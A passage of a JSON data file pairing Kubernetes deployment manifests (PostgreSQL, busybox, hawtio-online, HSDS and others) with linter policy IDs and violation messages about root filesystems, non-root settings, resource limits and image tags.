    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgresql-db\nspec:\n  selector:\n    matchLabels:\n      app: postgresql-db\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: postgresql-db\n    spec:\n      securityContext:\n        fsGroup: 2000\n      initContainers:\n      - name: init-chmod-data\n        image: postgres\n        command:\n        - sh\n        - -c\n        args:\n        - chown -R 1001:2000 /data\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n      containers:\n      - name: postgresql-db\n        image: postgres\n        securityContext:\n          runAsUser: 1001\n          runAsGroup: 2000\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: stock-market-secret\n              key: postgres-password\n        - name: PGDATA\n          value: /data/pgdata\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgresql-db\" does not have a read-only root file system"
  },
  {
    "id": "2772",
    "manifest_path": "data/manifests/the_stack_sample/sample_0781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgresql-db\nspec:\n  selector:\n    matchLabels:\n      app: postgresql-db\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: postgresql-db\n    spec:\n      securityContext:\n        fsGroup: 2000\n      initContainers:\n      - name: init-chmod-data\n        image: postgres\n        command:\n        - sh\n        - -c\n        args:\n        - chown -R 1001:2000 /data\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n      containers:\n      - name: postgresql-db\n        image: postgres\n        securityContext:\n          runAsUser: 1001\n          runAsGroup: 2000\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: stock-market-secret\n              key: postgres-password\n        - name: PGDATA\n          value: /data/pgdata\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-chmod-data\" is not set to runAsNonRoot"
  },
  {
    "id": "2773",
    "manifest_path": "data/manifests/the_stack_sample/sample_0781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgresql-db\nspec:\n  selector:\n    matchLabels:\n      app: postgresql-db\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: postgresql-db\n    spec:\n      securityContext:\n        fsGroup: 2000\n      initContainers:\n      - name: init-chmod-data\n        image: postgres\n        command:\n        - sh\n        - -c\n        args:\n        - chown -R 1001:2000 /data\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n      containers:\n      - name: postgresql-db\n        image: postgres\n        securityContext:\n          runAsUser: 1001\n          runAsGroup: 2000\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: stock-market-secret\n              key: postgres-password\n        - name: PGDATA\n          value: /data/pgdata\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-chmod-data\" has cpu request 0"
  },
  {
    "id": "2774",
    "manifest_path": "data/manifests/the_stack_sample/sample_0781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgresql-db\nspec:\n  selector:\n    matchLabels:\n      app: postgresql-db\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: postgresql-db\n    spec:\n      securityContext:\n        fsGroup: 2000\n      initContainers:\n      - name: init-chmod-data\n        image: postgres\n        command:\n        - sh\n        - -c\n        args:\n        - chown -R 1001:2000 /data\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n      containers:\n      - name: postgresql-db\n        image: postgres\n        securityContext:\n          runAsUser: 1001\n          runAsGroup: 2000\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: stock-market-secret\n              key: postgres-password\n        - name: PGDATA\n          value: /data/pgdata\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgresql-db\" has cpu request 0"
  },
  {
    "id": "2775",
    "manifest_path": "data/manifests/the_stack_sample/sample_0781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgresql-db\nspec:\n  selector:\n    matchLabels:\n      app: postgresql-db\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: postgresql-db\n    spec:\n      securityContext:\n        fsGroup: 2000\n      initContainers:\n      - name: init-chmod-data\n        image: postgres\n        command:\n        - sh\n        - -c\n        args:\n        - chown -R 1001:2000 /data\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n      containers:\n      - name: postgresql-db\n        image: postgres\n        securityContext:\n          runAsUser: 1001\n          runAsGroup: 2000\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: stock-market-secret\n              key: postgres-password\n        - name: PGDATA\n          value: /data/pgdata\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-chmod-data\" has memory limit 0"
  },
  {
    "id": "2776",
    "manifest_path": "data/manifests/the_stack_sample/sample_0781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgresql-db\nspec:\n  selector:\n    matchLabels:\n      app: postgresql-db\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: postgresql-db\n    spec:\n      securityContext:\n        fsGroup: 2000\n      initContainers:\n      - name: init-chmod-data\n        image: postgres\n        command:\n        - sh\n        - -c\n        args:\n        - chown -R 1001:2000 /data\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n      containers:\n      - name: postgresql-db\n        image: postgres\n        securityContext:\n          runAsUser: 1001\n          runAsGroup: 2000\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: stock-market-secret\n              key: postgres-password\n        - name: PGDATA\n          value: /data/pgdata\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgresql-db\" has memory limit 0"
  },
  {
    "id": "2777",
    "manifest_path": "data/manifests/the_stack_sample/sample_0783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: busybox\n  labels:\n    app: busybox\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: busybox\n  template:\n    metadata:\n      labels:\n        app: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: busybox:1.28\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - busybox\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "2778",
    "manifest_path": "data/manifests/the_stack_sample/sample_0783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: busybox\n  labels:\n    app: busybox\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: busybox\n  template:\n    metadata:\n      labels:\n        app: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: busybox:1.28\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - busybox\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "2779",
    "manifest_path": "data/manifests/the_stack_sample/sample_0783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: busybox\n  labels:\n    app: busybox\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: busybox\n  template:\n    metadata:\n      labels:\n        app: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: busybox:1.28\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - busybox\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "2780",
    "manifest_path": "data/manifests/the_stack_sample/sample_0783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: busybox\n  labels:\n    app: busybox\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: busybox\n  template:\n    metadata:\n      labels:\n        app: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: busybox:1.28\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - busybox\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "2781",
    "manifest_path": "data/manifests/the_stack_sample/sample_0786.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hawtio-online\n  labels:\n    app: hawtio\n    deployment: hawtio-online\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hawtio\n      deployment: hawtio-online\n  template:\n    metadata:\n      labels:\n        app: hawtio\n        deployment: hawtio-online\n    spec:\n      containers:\n      - image: hawtio/online\n        imagePullPolicy: Always\n        name: hawtio-online\n        ports:\n        - name: nginx\n          containerPort: 8443\n        livenessProbe:\n          httpGet:\n            path: /online\n            port: nginx\n            scheme: HTTPS\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /online\n            port: nginx\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 1\n        env:\n        - name: HAWTIO_ONLINE_RBAC_ACL\n          value: /etc/hawtio/rbac/ACL.yaml\n        resources:\n          requests:\n            cpu: '0.2'\n            memory: 32Mi\n          limits:\n            cpu: '1.0'\n            memory: 100Mi\n        volumeMounts:\n        - name: hawtio-online\n          mountPath: /usr/share/nginx/html/online/hawtconfig.json\n          subPath: hawtconfig.json\n        - name: hawtio-integration\n          mountPath: /usr/share/nginx/html/integration/hawtconfig.json\n          subPath: hawtconfig.json\n        - name: hawtio-rbac\n          mountPath: /etc/hawtio/rbac\n        - name: hawtio-online-tls-serving\n          mountPath: /etc/tls/private/serving\n      volumes:\n      - name: hawtio-online\n        configMap:\n          name: hawtio-online\n      - name: hawtio-integration\n        configMap:\n          name: hawtio-integration\n      - name: hawtio-rbac\n        configMap:\n          name: hawtio-rbac\n      - name: hawtio-online-tls-serving\n        secret:\n          secretName: hawtio-online-tls-serving\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hawtio-online\" is using an invalid container image, \"hawtio/online\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2782",
    "manifest_path": "data/manifests/the_stack_sample/sample_0786.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hawtio-online\n  labels:\n    app: hawtio\n    deployment: hawtio-online\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hawtio\n      deployment: hawtio-online\n  template:\n    metadata:\n      labels:\n        app: hawtio\n        deployment: hawtio-online\n    spec:\n      containers:\n      - image: hawtio/online\n        imagePullPolicy: Always\n        name: hawtio-online\n        ports:\n        - name: nginx\n          containerPort: 8443\n        livenessProbe:\n          httpGet:\n            path: /online\n            port: nginx\n            scheme: HTTPS\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /online\n            port: nginx\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 1\n        env:\n        - name: HAWTIO_ONLINE_RBAC_ACL\n          value: /etc/hawtio/rbac/ACL.yaml\n        resources:\n          requests:\n            cpu: '0.2'\n            memory: 32Mi\n          limits:\n            cpu: '1.0'\n            memory: 100Mi\n        volumeMounts:\n        - name: hawtio-online\n          mountPath: /usr/share/nginx/html/online/hawtconfig.json\n          subPath: hawtconfig.json\n        - name: hawtio-integration\n          mountPath: /usr/share/nginx/html/integration/hawtconfig.json\n          subPath: hawtconfig.json\n        - name: hawtio-rbac\n          mountPath: /etc/hawtio/rbac\n        - name: hawtio-online-tls-serving\n          mountPath: /etc/tls/private/serving\n      volumes:\n      - name: hawtio-online\n        configMap:\n          name: hawtio-online\n      - name: hawtio-integration\n        configMap:\n          name: hawtio-integration\n      - name: hawtio-rbac\n        configMap:\n          name: hawtio-rbac\n      - name: hawtio-online-tls-serving\n        secret:\n          secretName: hawtio-online-tls-serving\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hawtio-online\" does not have a read-only root file system"
  },
  {
    "id": "2783",
    "manifest_path": "data/manifests/the_stack_sample/sample_0786.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hawtio-online\n  labels:\n    app: hawtio\n    deployment: hawtio-online\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hawtio\n      deployment: hawtio-online\n  template:\n    metadata:\n      labels:\n        app: hawtio\n        deployment: hawtio-online\n    spec:\n      containers:\n      - image: hawtio/online\n        imagePullPolicy: Always\n        name: hawtio-online\n        ports:\n        - name: nginx\n          containerPort: 8443\n        livenessProbe:\n          httpGet:\n            path: /online\n            port: nginx\n            scheme: HTTPS\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /online\n            port: nginx\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 1\n        env:\n        - name: HAWTIO_ONLINE_RBAC_ACL\n          value: /etc/hawtio/rbac/ACL.yaml\n        resources:\n          requests:\n            cpu: '0.2'\n            memory: 32Mi\n          limits:\n            cpu: '1.0'\n            memory: 100Mi\n        volumeMounts:\n        - name: hawtio-online\n          mountPath: /usr/share/nginx/html/online/hawtconfig.json\n          subPath: hawtconfig.json\n        - name: hawtio-integration\n          mountPath: /usr/share/nginx/html/integration/hawtconfig.json\n          subPath: hawtconfig.json\n        - name: hawtio-rbac\n          mountPath: /etc/hawtio/rbac\n        - name: hawtio-online-tls-serving\n          mountPath: /etc/tls/private/serving\n      volumes:\n      - name: hawtio-online\n        configMap:\n          name: hawtio-online\n      - name: hawtio-integration\n        configMap:\n          name: hawtio-integration\n      - name: hawtio-rbac\n        configMap:\n          name: hawtio-rbac\n      - name: hawtio-online-tls-serving\n        secret:\n          secretName: hawtio-online-tls-serving\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hawtio-online\" is not set to runAsNonRoot"
  },
  {
    "id": "2784",
    "manifest_path": "data/manifests/the_stack_sample/sample_0788.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: default-http-backend\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/name: default-http-backend\n    app.kubernetes.io/part-of: ingress-nginx\n    addonmanager.kubernetes.io/mode: Reconcile\nspec:\n  type: NodePort\n  ports:\n  - port: 80\n    targetPort: 8080\n    protocol: TCP\n    name: http\n  selector:\n    app.kubernetes.io/name: default-http-backend\n    app.kubernetes.io/part-of: ingress-nginx\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:default-http-backend app.kubernetes.io/part-of:ingress-nginx])"
  },
  {
    "id": "2785",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dn1\" does not have a read-only root file system"
  },
  {
    "id": "2786",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dn2\" does not have a read-only root file system"
  },
  {
    "id": "2787",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        